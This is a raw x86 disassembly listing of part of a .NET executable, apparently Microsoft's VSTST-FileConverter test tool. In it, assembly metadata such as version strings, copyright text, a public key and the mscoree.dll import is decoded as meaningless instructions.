  402e4d:	gs jb  0x402ec3
  402e50:	imul   ebp,DWORD PTR [edi+0x6e],0x2e34763d
  402e57:	xor    eax,0xe540001
  402e5c:	adc    al,0x46
  402e5e:	jb     0x402ec1
  402e60:	ins    DWORD PTR es:[edi],dx
  402e61:	gs ja  0x402ed3
  402e64:	jb     0x402ed1
  402e66:	inc    esp
  402e67:	imul   esi,DWORD PTR [ebx+0x70],0x4e79616c
  402e6e:	popa   
  402e6f:	ins    DWORD PTR es:[edi],dx
  402e70:	add    BYTE PTR gs:0x1,al
  402e77:	add    BYTE PTR ds:0x10001,al
  402e7d:	add    BYTE PTR [ecx+eax*1],bl
  402e80:	add    BYTE PTR [edi],dl
  402e82:	push   esi
  402e83:	push   ebx
  402e84:	push   esp
  402e85:	push   ebx
  402e86:	push   esp
  402e87:	sub    eax,0x656c6946
  402e8c:	inc    ebx
  402e8d:	outs   dx,DWORD PTR ds:[esi]
  402e8e:	outs   dx,BYTE PTR ds:[esi]
  402e8f:	jbe    0x402ef6
  402e91:	jb     0x402f07
  402e93:	gs jb  0x402ec4
  402e96:	gs js  0x402efe
  402e99:	add    BYTE PTR [eax],al
  402e9b:	sbb    al,BYTE PTR [ecx]
  402e9d:	add    BYTE PTR ds:0x7263694d,dl
  402ea3:	outs   dx,DWORD PTR ds:[esi]
  402ea4:	jae    0x402f15
  402ea6:	data16 je 0x402ec9
  402ea9:	inc    ebx
  402eaa:	outs   dx,DWORD PTR ds:[esi]
  402eab:	jb     0x402f1d
  402ead:	outs   dx,DWORD PTR ds:[esi]
  402eae:	jb     0x402f11
  402eb0:	je     0x402f1b
  402eb2:	outs   dx,DWORD PTR ds:[esi]
  402eb3:	outs   dx,BYTE PTR ds:[esi]
  402eb4:	add    BYTE PTR [eax],al
  402eb6:	and    eax,0x4d200001
  402ebb:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  402ec2:	je     0x402e86
  402ec4:	scas   al,BYTE PTR es:[edi]
  402ec5:	and    BYTE PTR [esi+0x69],dl
  402ec8:	jae    0x402f3f
  402eca:	popa   
  402ecb:	ins    BYTE PTR es:[edi],dx
  402ecc:	and    BYTE PTR [ebx+0x74],dl
  402ecf:	jne    0x402f35
  402ed1:	imul   ebp,DWORD PTR [edi-0x3e],0x303220ae
  402ed8:	xor    DWORD PTR [edx],esi
  402eda:	add    BYTE PTR [eax],al
  402edc:	xor    eax,DWORD PTR [ecx]
  402ede:	add    BYTE PTR [esi],ch
  402ee0:	ret    0x20a9
  402ee3:	dec    ebp
  402ee4:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  402eeb:	je     0x402f0d
  402eed:	inc    ebx
  402eee:	outs   dx,DWORD PTR ds:[esi]
  402eef:	jb     0x402f61
  402ef1:	outs   dx,DWORD PTR ds:[esi]
  402ef2:	jb     0x402f55
  402ef4:	je     0x402f5f
  402ef6:	outs   dx,DWORD PTR ds:[esi]
  402ef7:	outs   dx,BYTE PTR ds:[esi]
  402ef8:	and    BYTE PTR cs:[ecx+0x6c],al
  402efc:	ins    BYTE PTR es:[edi],dx
  402efd:	and    BYTE PTR [edx+0x69],dh
  402f00:	addr16 push 0x72207374
  402f06:	gs jae 0x402f6e
  402f09:	jb     0x402f81
  402f0b:	gs fs add BYTE PTR cs:[eax],al
  402f10:	adc    DWORD PTR [ecx],eax
  402f12:	add    BYTE PTR [ecx+esi*1],cl
  402f15:	xor    DWORD PTR [esi],ebp
  402f17:	xor    BYTE PTR [esi],ch
  402f19:	xor    eax,0x37323730
  402f1e:	xor    DWORD PTR cs:[eax],eax
  402f21:	add    BYTE PTR ds:0x31080001,cl
  402f27:	xor    DWORD PTR [esi],ebp
  402f29:	xor    BYTE PTR [esi],ch
  402f2b:	xor    BYTE PTR [esi],ch
  402f2d:	xor    BYTE PTR [eax],al
  402f2f:	add    BYTE PTR [edx],cl
  402f31:	add    DWORD PTR [eax],eax
  402f33:	add    eax,0x552d6e65
  402f38:	push   ebx
  402f39:	add    BYTE PTR [eax],al
  402f3b:	sub    al,BYTE PTR [ecx]
  402f3d:	add    BYTE PTR ds:0x645c3a46,ah
  402f43:	fs pop esp
  402f45:	je     0x402fb6
  402f47:	outs   dx,DWORD PTR ds:[esi]
  402f48:	ins    BYTE PTR es:[edi],dx
  402f49:	jae    0x402fa7
  402f4b:	fs gs jbe 0x402fb3
  402f4f:	imul   esi,DWORD PTR [esi+0x5c],0x616e6946
  402f56:	ins    BYTE PTR es:[edi],dx
  402f57:	push   eax
  402f58:	jne    0x402fbc
  402f5a:	ins    BYTE PTR es:[edi],dx
  402f5b:	imul   esp,DWORD PTR [ebx+0x4b],0x732e7965
  402f62:	outs   dx,BYTE PTR ds:[esi]
  402f63:	imul   eax,DWORD PTR [eax],0x0
  402f66:	or     DWORD PTR [eax+0x1],0x0
  402f6a:	add    BYTE PTR [eax+0x30],0x30
  402f6e:	xor    dh,BYTE PTR [eax+esi*1]
  402f71:	xor    BYTE PTR [eax],dh
  402f73:	xor    BYTE PTR [eax],dh
  402f75:	arpl   WORD PTR [eax],di
  402f77:	xor    BYTE PTR [eax],dh
  402f79:	xor    BYTE PTR [eax],dh
  402f7b:	xor    BYTE PTR [ecx],dh
  402f7d:	xor    al,0x30
  402f7f:	xor    DWORD PTR [eax],esi
  402f81:	xor    BYTE PTR [eax],dh
  402f83:	xor    BYTE PTR [eax],dh
  402f85:	xor    BYTE PTR ss:[edx],dh
  402f88:	xor    BYTE PTR [eax],dh
  402f8a:	xor    BYTE PTR [eax],dh
  402f8c:	xor    BYTE PTR [eax],dh
  402f8e:	xor    dh,BYTE PTR [eax+esi*1]
  402f91:	xor    BYTE PTR [eax],dh
  402f93:	xor    BYTE PTR ds:0x34333532,dh
  402f99:	xor    DWORD PTR [ebx],esi
  402f9b:	xor    DWORD PTR [eax],esi
  402f9d:	xor    BYTE PTR [eax],dh
  402f9f:	cmp    BYTE PTR [eax],dh
  402fa1:	xor    BYTE PTR [eax],dh
  402fa3:	xor    BYTE PTR [eax],dh
  402fa5:	xor    DWORD PTR [eax],esi
  402fa7:	xor    BYTE PTR [eax],dh
  402fa9:	xor    DWORD PTR [eax],esi
  402fab:	xor    BYTE PTR [esi],dh
  402fad:	xor    DWORD PTR [ebx],esi
  402faf:	xor    edi,DWORD PTR [ecx]
  402fb1:	cmp    DWORD PTR [ecx+0x66],esp
  402fb4:	xor    WORD PTR [eax],di
  402fb7:	xor    WORD PTR gs:[ecx+0x32],sp
  402fbc:	arpl   WORD PTR [edx],si
  402fbe:	xor    eax,0x32613431
  402fc3:	aaa    
  402fc4:	xor    esp,DWORD PTR [ecx+0x34]
  402fc7:	xor    ah,BYTE PTR [ecx+edi*1+0x30]
  402fcb:	xor    al,0x32
  402fcd:	bound  esi,QWORD PTR [edi]
  402fcf:	xor    dh,BYTE PTR [ebx]
  402fd1:	xor    dh,BYTE PTR [ecx]
  402fd3:	xor    WORD PTR [edi],si
  402fd6:	xor    eax,0x32303137
  402fdb:	cmp    WORD PTR fs:[ebp+0x62],sp
  402fe0:	popa   
  402fe1:	fs popa 
  402fe3:	cmp    DWORD PTR ss:[ecx],edi
  402fe6:	xor    dh,BYTE PTR [ebx]
  402fe8:	xor    dh,BYTE PTR gs:[edi]
  402feb:	xor    edi,DWORD PTR [eax]
  402fed:	xor    al,0x30
  402fef:	arpl   WORD PTR ss:[edx],si
  402ff2:	xor    DWORD PTR [ebp+0x35],esp
  402ff5:	bound  edi,QWORD PTR [eax]
  402ff7:	xor    BYTE PTR [ecx],dh
  402ff9:	xor    eax,0x62613235
  402ffe:	cmp    BYTE PTR [edx+esi*1+0x30],ah
  403002:	xor    BYTE PTR [ecx+0x36],ah
  403005:	xor    eax,0x35333261
  40300a:	xor    BYTE PTR gs:[eax],dh
  40300d:	xor    DWORD PTR [ecx+0x63],esp
  403010:	cmp    DWORD PTR [ecx+0x64],esp
  403013:	arpl   WORD PTR [edx],si
  403015:	xor    eax,0x38643266
  40301a:	xor    DWORD PTR [ecx],esi
  40301c:	bound  esi,QWORD PTR gs:[eax]
  40301f:	cmp    DWORD PTR [ecx+edi*1],esi
  403022:	ss popa 
  403024:	xor    al,0x63
  403026:	ss popa 
  403028:	xor    eax,0x36346439
  40302d:	xor    DWORD PTR [ecx],edi
  40302f:	xor    eax,0x36633938
  403034:	cmp    DWORD PTR [esi+0x35],esp
  403037:	bound  esp,QWORD PTR [ecx+0x66]
  40303a:	xor    BYTE PTR [ebx+0x34],ah
  40303d:	xor    DWORD PTR [edi],esi
  40303f:	cmp    DWORD PTR [ecx+0x34],esp
  403042:	aaa    
  403043:	xor    esi,DWORD PTR [ecx]
  403045:	xor    DWORD PTR [ecx+edi*1+0x32],esp
  403049:	xor    eax,0x64633535
  40304e:	xor    BYTE PTR [eax],dh
  403050:	ss popa 
  403052:	arpl   WORD PTR [ebx+0x38],sp
  403055:	bound  esi,QWORD PTR ds:0x66393539
  40305b:	xor    ah,BYTE PTR [edx+0x64]
  40305e:	ss xor DWORD PTR gs:[eax],esi
  403062:	xor    esi,DWORD PTR gs:[esi]
  403065:	xor    BYTE PTR [ebx+0x33],ah
  403068:	xor    al,0x35
  40306a:	xor    esi,DWORD PTR [edi]
  40306c:	popa   
  40306d:	xor    DWORD PTR [edx+esi*1+0x36],esp
  403071:	ss fs popa 
  403074:	cmp    BYTE PTR [eax],dh
  403076:	cmp    BYTE PTR ds:0x35363538,dh
  40307c:	cmp    BYTE PTR [ebx],dh
  40307e:	arpl   WORD PTR [eax],di
  403080:	xor    eax,0x64313864
  403085:	popa   
  403086:	aaa    
  403087:	xor    sp,WORD PTR [ebp+0x63]
  40308b:	xor    BYTE PTR [ecx],dh
  40308d:	gs cmp DWORD PTR fs:0x35633436,esi
  403095:	cmp    BYTE PTR [ecx+edi*1+0x33],ah
  403099:	fs aaa 
  40309b:	xor    DWORD PTR [ebx],esi
  40309d:	arpl   WORD PTR [eax+esi*1+0x31],sp
  4030a1:	aaa    
  4030a2:	xor    ah,BYTE PTR [ebx+0x38]
  4030a5:	xor    dh,BYTE PTR gs:[ebx]
  4030a8:	popa   
  4030a9:	xor    DWORD PTR [eax],esi
  4030ab:	data16 xor BYTE PTR [edx],dh
  4030ae:	xor    edi,DWORD PTR [ecx]
  4030b0:	bound  edi,QWORD PTR [eax]
  4030b2:	xor    BYTE PTR [ebx+0x39],ah
  4030b5:	bound  esi,QWORD PTR ss:[eax]
  4030b8:	aaa    
  4030b9:	aaa    
  4030ba:	xor    esi,DWORD PTR [esi]
  4030bc:	xor    ax,0x3864
  4030c0:	bound  esi,QWORD PTR [eax]
  4030c2:	xor    dh,BYTE PTR [edx]
  4030c4:	xor    eax,0x34613234
  4030c9:	gs aaa 
  4030cb:	xor    al,0x32
  4030cd:	xor    eax,0x66356131
  4030d2:	xor    al,0x33
  4030d4:	xor    bh,BYTE PTR [eax]
  4030d6:	xor    dh,BYTE PTR [ebx+esi*1]
  4030d9:	xor    DWORD PTR [eax],edi
  4030db:	bound  esi,QWORD PTR [ebx]
  4030dd:	xor    eax,0x35613933
  4030e2:	popa   
  4030e3:	xor    BYTE PTR [eax],bh
  4030e5:	aaa    
  4030e6:	data16 cmp BYTE PTR [ebp+0x35],ah
  4030ea:	xor    esp,DWORD PTR [edx+esi*1+0x66]
  4030ee:	xor    DWORD PTR [ebx],esi
  4030f0:	xor    eax,0x61633966
  4030f5:	xor    al,0x37
  4030f7:	xor    sp,WORD PTR [edx+0x62]
  4030fb:	xor    ah,BYTE PTR [ebp+0x31]
  4030fe:	xor    BYTE PTR [ecx+0x66],ah
  403101:	data16 xor BYTE PTR [ecx+0x66],ah
  403105:	xor    BYTE PTR [eax],bh
  403107:	xor    al,0x39
  403109:	xor    eax,0x62663430
  40310e:	aaa    
  40310f:	arpl   WORD PTR [ebp+0x61],sp
  403112:	xor    esp,DWORD PTR [esi+0x66]
  403115:	xor    DWORD PTR [ecx],edi
  403117:	xor    ah,BYTE PTR [ebx+eiz*2+0x38]
  40311b:	fs xor BYTE PTR gs:[ebp+0x64],ah
  403120:	popa   
  403121:	fs ss xor al,0x63
  403125:	cmp    BYTE PTR ss:[ebp+0x66],ah
  403129:	fs xor esi,DWORD PTR gs:[ebx+eiz*2]
  40312e:	xor    eax,0x30336436
  403133:	xor    ah,BYTE PTR [ecx+0x64]
  403136:	xor    eax,0x36646635
  40313b:	cmp    BYTE PTR gs:[eax],dh
  40313e:	xor    si,WORD PTR [eax]
  403141:	xor    ah,BYTE PTR [ebp+esi*1+0x65]
  403145:	data16 arpl WORD PTR [ebp+eiz*2+0x61],sp
  40314a:	cmp    DWORD PTR gs:0x38353633,esi
  403151:	xor    esi,DWORD PTR fs:[esi*1+0x31363532]
  403159:	bound  esi,QWORD PTR ds:0x63363366
  40315f:	xor    eax,0x66653234
  403164:	bound  esp,QWORD PTR fs:[esp+eiz*2+0x39]
  403169:	data16 cmp BYTE PTR [eax],bh
  40316c:	cmp    BYTE PTR ds:0x33643833,dh
  403172:	aaa    
  403173:	xor    al,0x63
  403175:	xor    WORD PTR gs:[eax],si
  403179:	ss popa 
  40317b:	arpl   WORD PTR [esi+0x37],sp
  40317e:	cmp    DWORD PTR fs:[ebx],esi
  403181:	popa   
  403182:	xor    al,0x34
  403184:	xor    al,0x35
  403186:	arpl   WORD PTR [ebx],si
  403188:	arpl   WORD PTR [edi],si
  40318a:	xor    esp,DWORD PTR [ebx+0x64]
  40318d:	cmp    DWORD PTR [ecx],esi
  40318f:	xor    DWORD PTR [esi+0x30],esp
  403192:	xor    eax,0x61613137
  403197:	xor    sp,WORD PTR [ebp+esi*1+0x34]
  40319c:	fs popa 
  40319e:	xor    DWORD PTR [edx],esi
  4031a0:	bound  esi,QWORD PTR [ecx]
  4031a2:	xor    DWORD PTR [esp+eiz*2+0x65],esp
  4031a6:	arpl   WORD PTR [ebx],si
  4031a8:	aaa    
  4031a9:	xor    eax,0x813362
  4031ae:	popa   
  4031af:	xor    eax,0x36363861
  4031b4:	xor    DWORD PTR gs:[ebp+0x65],esp
  4031b8:	xor    DWORD PTR [eax],edi
  4031ba:	data16 cmp BYTE PTR ss:[eax],dh
  4031be:	aaa    
  4031bf:	ss cmp BYTE PTR ss:[edx],dh
  4031c3:	xor    BYTE PTR [ecx],bh
  4031c5:	xor    sp,WORD PTR [edx+0x31]
  4031c9:	xor    DWORD PTR [edx],esi
  4031cb:	xor    esi,DWORD PTR [esi]
  4031cd:	popa   
  4031ce:	arpl   WORD PTR [ebp+0x35],sp
  4031d1:	xor    dh,BYTE PTR gs:[ecx]
  4031d4:	xor    WORD PTR [ecx],si
  4031d7:	aaa    
  4031d8:	cmp    BYTE PTR [eax],dh
  4031da:	xor    esp,DWORD PTR [ecx+0x33]
  4031dd:	xor    DWORD PTR [ebx+esi*1],esi
  4031e0:	popa   
  4031e1:	bound  esp,QWORD PTR [edx+0x31]
  4031e4:	xor    dh,BYTE PTR [esi]
  4031e6:	fs xor BYTE PTR fs:[ebx],dh
  4031ea:	xor    eax,0x32643764
  4031ef:	data16 cmp BYTE PTR [edi],dh
  4031f2:	bound  esi,QWORD PTR ss:[esi]
  4031f5:	cmp    DWORD PTR [ebx],esi
  4031f7:	cmp    BYTE PTR [ecx+0x61],ah
  4031fa:	data16 xor ah,BYTE PTR [ebp+0x65]
  4031fe:	xor    esi,DWORD PTR [ecx+esi*1]
  403201:	xor    al,0x64
  403203:	xor    eax,0x64303234
  403208:	aaa    
  403209:	xor    eax,0x31323633
  40320e:	xor    al,0x30
  403210:	xor    BYTE PTR [edx+eiz*2+0x34],ah
  403214:	xor    al,0x61
  403216:	xor    al,0x39
  403218:	arpl   WORD PTR [eax+edi*1],si
  40321b:	arpl   WORD PTR ss:[ebp+0x31],sp
  40321f:	xor    esi,DWORD PTR [ebx+esi*1]
  403222:	xor    BYTE PTR [eax],dh
  403224:	popa   
  403225:	xor    dh,BYTE PTR [ecx]
  403227:	xor    BYTE PTR [esi],dh
  403229:	popa   
  40322a:	bound  esi,QWORD PTR fs:[esi]
  40322d:	bound  esp,QWORD PTR [edx+eiz*2+0x34]
  403231:	xor    esi,DWORD PTR [ebx]
  403233:	xor    eax,0x65663039
  403238:	data16 cmp BYTE PTR [ecx+0x64],ah
  40323c:	xor    eax,0x63333463
  403241:	bound  esp,QWORD PTR [ecx+0x38]
  403244:	xor    dh,BYTE PTR [edx]
  403246:	cmp    DWORD PTR [eax],esi
  403248:	arpl   WORD PTR fs:[ecx+edi*1],si
  40324c:	xor    eax,0x66653033
  403251:	data16 cmp BYTE PTR fs:[esi],dh
  403255:	xor    eax,0x39643332
  40325a:	xor    al,0x38
  40325c:	xor    esp,DWORD PTR [ebx+0x30]
  40325f:	xor    BYTE PTR [esi+0x34],ah
  403262:	xor    eax,0x34666138
  403267:	cmp    BYTE PTR ss:[ecx],bh
  40326a:	xor    BYTE PTR [eax],dh
  40326c:	xor    esi,DWORD PTR [esi]
  40326e:	bound  esi,QWORD PTR [eax]
  403270:	xor    ah,BYTE PTR gs:[ebx+0x36]
  403274:	xor    DWORD PTR [eax+esi*1+0x37],esp
  403278:	aaa    
  403279:	fs aaa 
  40327b:	bound  sp,DWORD PTR [ecx+0x63]
  40327f:	xor    al,0x36
  403281:	aaa    
  403282:	popa   
  403283:	xor    eax,0x62653630
  403288:	popa   
  403289:	xor    bh,BYTE PTR [ecx]
  40328b:	gs xor al,0x36
  40328e:	aaa    
  40328f:	popa   
  403290:	cmp    BYTE PTR [edi],dh
  403292:	xor    DWORD PTR [ecx],edi
  403294:	cmp    BYTE PTR [edx+0x30],ah
  403297:	xor    eax,0x34376333
  40329c:	cmp    DWORD PTR [ecx+0x61],esp
  40329f:	xor    ah,BYTE PTR [ecx+0x34]
  4032a2:	xor    bh,BYTE PTR fs:[eax]
  4032a5:	xor    al,0x30
  4032a7:	arpl   WORD PTR [edi],si
  4032a9:	cmp    BYTE PTR [eiz*2+0x6436],dh
  4032b0:	push   ds
  4032b1:	add    DWORD PTR [eax],eax
  4032b3:	add    DWORD PTR [eax],eax
  4032b5:	push   esp
  4032b6:	add    dl,BYTE PTR [esi]
  4032b8:	push   edi
  4032b9:	jb     0x40331c
  4032bb:	jo     0x40330b
  4032bd:	outs   dx,DWORD PTR ds:[esi]
  4032be:	outs   dx,BYTE PTR ds:[esi]
  4032bf:	inc    ebp
  4032c0:	js     0x403325
  4032c2:	gs jo  0x403339
  4032c5:	imul   ebp,DWORD PTR [edi+0x6e],0x6f726854
  4032cc:	ja     0x403341
  4032ce:	add    DWORD PTR [eax],ecx
  4032d0:	add    DWORD PTR [eax],eax
  4032d2:	add    al,BYTE PTR [eax]
  4032d4:	add    BYTE PTR [eax],al
  4032d6:	add    BYTE PTR [eax],al
  4032d8:	or     BYTE PTR [ecx],al
  4032da:	add    BYTE PTR [eax],cl
	...
  4032e8:	push   ecx
  4032e9:	fist   WORD PTR [ecx]
  4032eb:	push   eax
  4032ec:	add    BYTE PTR [eax],al
  4032ee:	add    BYTE PTR [eax],al
  4032f0:	add    al,BYTE PTR [eax]
  4032f2:	add    BYTE PTR [eax],al
  4032f4:	sbb    al,0x1
  4032f6:	add    BYTE PTR [eax],al
  4032f8:	add    BYTE PTR [ebx],dh
  4032fa:	add    BYTE PTR [eax],al
  4032fc:	add    BYTE PTR ds:0x53520000,dl
  403302:	inc    esp
  403303:	push   ebx
  403304:	sub    ebx,DWORD PTR [eax+0x23]
  403307:	or     cl,BYTE PTR [ebx]
  403309:	enter  0x4b93,0xad
  40330d:	mov    edi,0xbac65c3e
  403312:	adc    edi,DWORD PTR [ecx+eax*1+0x66000000]
  403319:	cmp    bl,BYTE PTR [edx+eiz*2+0x69]
  40331d:	outs   dx,BYTE PTR ds:[esi]
  40331e:	popa   
  40331f:	jb     0x40338a
  403321:	gs jae 0x403380
  403324:	dec    ecx
  403325:	outs   dx,BYTE PTR ds:[esi]
  403326:	je     0x40338d
  403328:	jb     0x403397
  40332a:	gs imul esp,DWORD PTR fs:[ecx+0x74],0x73765c65
  403333:	gs je  0x403392
  403336:	imul   bp,WORD PTR [ebp+eiz*2+0x66],0x726f
  40333d:	ins    DWORD PTR es:[edi],dx
  40333e:	popa   
  40333f:	je     0x4033b6
  403341:	jo     0x4033aa
  403343:	jb     0x4033a6
  403345:	fs gs jb 0x403377
  403349:	arpl   WORD PTR [ebx+0x70],si
  40334c:	jb     0x4033bd
  40334e:	push   0x5f
  403350:	xor    DWORD PTR [edx],esi
  403352:	xor    al,0x33
  403354:	cmp    BYTE PTR ss:[edx],dh
  403357:	xor    esi,DWORD PTR [ecx]
  403359:	xor    ebx,DWORD PTR [edi+ebp*2+0x62]
  40335d:	push   0x72
  40335f:	pop    esp
  403360:	js     0x40339a
  403362:	ss pop esp
  403364:	push   esi
  403365:	push   ebx
  403366:	push   esp
  403367:	push   ebx
  403368:	push   esp
  403369:	sub    eax,0x656c6946
  40336e:	inc    ebx
  40336f:	outs   dx,DWORD PTR ds:[esi]
  403370:	outs   dx,BYTE PTR ds:[esi]
  403371:	jbe    0x4033d8
  403373:	jb     0x4033e9
  403375:	gs jb  0x4033a6
  403378:	jo     0x4033de
  40337a:	bound  eax,QWORD PTR [eax]
	...
  40341c:	inc    esp
  40341d:	xor    al,0x0
	...
  403427:	add    BYTE PTR [esi+0x34],bl
  40342a:	add    BYTE PTR [eax],al
  40342c:	add    BYTE PTR [eax],ah
	...
  403442:	add    BYTE PTR [eax],al
  403444:	push   eax
  403445:	xor    al,0x0
	...
  40344f:	add    BYTE PTR [eax],al
  403451:	add    BYTE PTR [edi+0x43],bl
  403454:	outs   dx,DWORD PTR ds:[esi]
  403455:	jb     0x40349c
  403457:	js     0x4034be
  403459:	dec    ebp
  40345a:	popa   
  40345b:	imul   ebp,DWORD PTR [esi+0x0],0x6f63736d
  403462:	jb     0x4034c9
  403464:	gs cs fs ins BYTE PTR es:[edi],dx
  403468:	ins    BYTE PTR es:[edi],dx
  403469:	add    BYTE PTR [eax],al
  40346b:	add    BYTE PTR [eax],al
  40346d:	add    bh,bh
  40346f:	and    eax,0x402000
